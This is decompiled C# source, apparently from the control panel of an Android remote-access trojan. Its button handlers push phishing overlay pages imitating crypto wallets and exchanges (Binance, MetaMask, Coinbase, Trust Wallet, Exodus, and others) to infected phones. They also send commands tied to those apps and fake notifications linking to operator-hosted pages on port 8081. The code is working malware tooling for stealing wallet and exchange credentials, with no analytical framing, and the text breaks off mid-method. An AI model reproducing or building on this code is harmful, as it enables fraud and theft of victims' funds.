		// Token: 0x06000BDA RID: 3034 RVA: 0x00101D84 File Offset: 0x000FFF84
		private void drakeUIButtonIcon69_Click(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\Programs\\Files\\crypto\\trustwallet.html";
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000BDB RID: 3035 RVA: 0x00101ED0 File Offset: 0x001000D0
		private void drakeUIButtonIcon72_Click(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\Programs\\Files\\crypto\\binance.html";
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000BDC RID: 3036 RVA: 0x0010201C File Offset: 0x0010021C
		private void drakeUIButtonIcon75_Click(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\Programs\\Files\\crypto\\huobi.html";
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000BDD RID: 3037 RVA: 0x00102168 File Offset: 0x00100368
		private void drakeUIButtonIcon78_Click(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\Programs\\Files\\crypto\\kucoin.html";
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000BDE RID: 3038 RVA: 0x001022B4 File Offset: 0x001004B4
		private void drakeUIButtonIcon81_Click(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\Programs\\Files\\crypto\\metamask.html";
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000BDF RID: 3039 RVA: 0x00102400 File Offset: 0x00100600
		private void drakeUIButtonIcon84_Click(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\Programs\\Files\\crypto\\exodus.html";
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000BE0 RID: 3040 RVA: 0x0010254C File Offset: 0x0010074C
		private void drakeUIButtonIcon87_Click(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\Programs\\Files\\crypto\\coinbase.html";
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000BE1 RID: 3041 RVA: 0x00102698 File Offset: 0x00100898
		private void drakeUIButtonIcon90_Click(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\Programs\\Files\\crypto\\coinbasewallet.html";
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000BE2 RID: 3042 RVA: 0x001027E4 File Offset: 0x001009E4
		private void drakeUIButtonIcon94_Click(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\Programs\\Files\\crypto\\blockchain.html";
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000BE3 RID: 3043 RVA: 0x00102930 File Offset: 0x00100B30
		private void drakeUIButtonIcon97_Click(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\Programs\\Files\\bank\\wechat.html";
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000BE4 RID: 3044 RVA: 0x00102A7C File Offset: 0x00100C7C
		private void drakeUIAvatar6_Click(object sender, EventArgs e)
		{
			string text = "kraken";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
		}

		// Token: 0x06000BE5 RID: 3045 RVA: 0x00102B90 File Offset: 0x00100D90
		private void drakeUIAvatar7_Click(object sender, EventArgs e)
		{
			string text = "trustwallet";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
		}

		// Token: 0x06000BE6 RID: 3046 RVA: 0x00102CA4 File Offset: 0x00100EA4
		private void drakeUIAvatar8_Click(object sender, EventArgs e)
		{
			string text = "binance";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
		}

		// Token: 0x06000BE7 RID: 3047 RVA: 0x00102DB8 File Offset: 0x00100FB8
		private void drakeUIAvatar9_Click(object sender, EventArgs e)
		{
			string text = "huobi";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
		}

		// Token: 0x06000BE8 RID: 3048 RVA: 0x00102ECC File Offset: 0x001010CC
		private void drakeUIAvatar10_Click(object sender, EventArgs e)
		{
			string text = "kucoin";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
		}

		// Token: 0x06000BE9 RID: 3049 RVA: 0x00102FE0 File Offset: 0x001011E0
		private void drakeUIAvatar11_Click(object sender, EventArgs e)
		{
			string text = "metamask";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
		}

		// Token: 0x06000BEA RID: 3050 RVA: 0x001030F4 File Offset: 0x001012F4
		private void drakeUIAvatar12_Click(object sender, EventArgs e)
		{
			string text = "exodus";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
		}

		// Token: 0x06000BEB RID: 3051 RVA: 0x00103208 File Offset: 0x00101408
		private void drakeUIAvatar15_Click(object sender, EventArgs e)
		{
			string text = "coinbase";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
		}

		// Token: 0x06000BEC RID: 3052 RVA: 0x0010331C File Offset: 0x0010151C
		private void drakeUIAvatar14_Click(object sender, EventArgs e)
		{
			string text = "coinbasewallet";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
		}

		// Token: 0x06000BED RID: 3053 RVA: 0x00103430 File Offset: 0x00101630
		private void drakeUIAvatar13_Click(object sender, EventArgs e)
		{
			string text = "blockchain";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
		}

		// Token: 0x06000BEE RID: 3054 RVA: 0x00103544 File Offset: 0x00101744
		private void drakeUIButtonIcon71_Click(object sender, EventArgs e)
		{
			using (Dialogue3 dialogue = new Dialogue3())
			{
				DialogResult dialogResult = dialogue.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string bodyText = dialogue.BodyText;
					string messageText = dialogue.MessageText;
					string text = "http://" + this.ip.Text + ":8081/crypto/binance.html";
					string text2 = string.Concat(new string[] { bodyText, ">", messageText, ">2>", text, ">0>" });
					if (this.classClient != null)
					{
						try
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.classClient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"noti<*>",
									text2,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x06000BEF RID: 3055 RVA: 0x0010371C File Offset: 0x0010191C
		private void drakeUIButtonIcon74_Click(object sender, EventArgs e)
		{
			using (Dialogue3 dialogue = new Dialogue3())
			{
				DialogResult dialogResult = dialogue.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string bodyText = dialogue.BodyText;
					string messageText = dialogue.MessageText;
					string text = "http://" + this.ip.Text + ":8081/crypto/huobi.html";
					string text2 = string.Concat(new string[] { bodyText, ">", messageText, ">2>", text, ">0>" });
					if (this.classClient != null)
					{
						try
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.classClient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"noti<*>",
									text2,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x06000BF0 RID: 3056 RVA: 0x001038F4 File Offset: 0x00101AF4
		private void drakeUIButtonIcon77_Click(object sender, EventArgs e)
		{
			using (Dialogue3 dialogue = new Dialogue3())
			{
				DialogResult dialogResult = dialogue.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string bodyText = dialogue.BodyText;
					string messageText = dialogue.MessageText;
					string text = "http://" + this.ip.Text + ":8081/crypto/kucoin.html";
					string text2 = string.Concat(new string[] { bodyText, ">", messageText, ">2>", text, ">0>" });
					if (this.classClient != null)
					{
						try
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.classClient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"noti<*>",
									text2,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x06000BF1 RID: 3057 RVA: 0x00103ACC File Offset: 0x00101CCC
		private void drakeUIButtonIcon80_Click(object sender, EventArgs e)
		{
			using (Dialogue3 dialogue = new Dialogue3())
			{
				DialogResult dialogResult = dialogue.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string bodyText = dialogue.BodyText;
					string messageText = dialogue.MessageText;
					string text = "http://" + this.ip.Text + ":8081/crypto/metamask.html";
					string text2 = string.Concat(new string[] { bodyText, ">", messageText, ">2>", text, ">0>" });
					if (this.classClient != null)
					{
						try
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.classClient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"noti<*>",
									text2,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x06000BF2 RID: 3058 RVA: 0x00103CA4 File Offset: 0x00101EA4
		private void drakeUIButtonIcon83_Click(object sender, EventArgs e)
		{
			using (Dialogue3 dialogue = new Dialogue3())
			{
				DialogResult dialogResult = dialogue.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string bodyText = dialogue.BodyText;
					string messageText = dialogue.MessageText;
					string text = "http://" + this.ip.Text + ":8081/crypto/exodus.html";
					string text2 = string.Concat(new string[] { bodyText, ">", messageText, ">2>", text, ">0>" });
					if (this.classClient != null)
					{
						try
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.classClient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"noti<*>",
									text2,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x06000BF3 RID: 3059 RVA: 0x00103E7C File Offset: 0x0010207C
		private void drakeUIButtonIcon86_Click(object sender, EventArgs e)
		{
			using (Dialogue3 dialogue = new Dialogue3())
			{
				DialogResult dialogResult = dialogue.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string bodyText = dialogue.BodyText;
					string messageText = dialogue.MessageText;
					string text = "http://" + this.ip.Text + ":8081/crypto/coinbase.html";
					string text2 = string.Concat(new string[] { bodyText, ">", messageText, ">2>", text, ">0>" });
					if (this.classClient != null)
					{
						try
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.classClient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"noti<*>",
									text2,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x06000BF4 RID: 3060 RVA: 0x00104054 File Offset: 0x00102254
		private void drakeUIButtonIcon89_Click(object sender, EventArgs e)
		{
			using (Dialogue3 dialogue = new Dialogue3())
			{
				DialogResult dialogResult = dialogue.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string bodyText = dialogue.BodyText;
					string messageText = dialogue.MessageText;
					string text = "http://" + this.ip.Text + ":8081/crypto/coinbasewallet.html";
					string text2 = string.Concat(new string[] { bodyText, ">", messageText, ">2>", text, ">0>" });
					if (this.classClient != null)
					{
						try
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.classClient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"noti<*>",
									text2,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x06000BF5 RID: 3061 RVA: 0x0010422C File Offset: 0x0010242C
		private void drakeUIButtonIcon93_Click(object sender, EventArgs e)
		{
			using (Dialogue3 dialogue = new Dialogue3())
			{
				DialogResult dialogResult = dialogue.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string bodyText = dialogue.BodyText;
					string messageText = dialogue.MessageText;
